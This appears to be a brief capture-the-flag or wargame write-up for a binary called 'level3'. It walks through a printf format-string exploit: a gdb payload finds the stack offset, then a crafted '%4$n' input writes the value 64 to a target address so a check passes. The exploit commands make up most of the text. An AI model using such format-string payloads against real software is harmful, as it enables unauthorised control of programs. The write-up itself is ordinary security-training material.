We can exploit printf by passing what we want.


(gdb) run < <(python -c 'print "AAAA" + "%#x " * 12')

We can see that we overwrite at offset 4

%n write the number of byte at the address given

cat <(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"') - | ./level3

it check for cmp 64, so we write 64 bytes
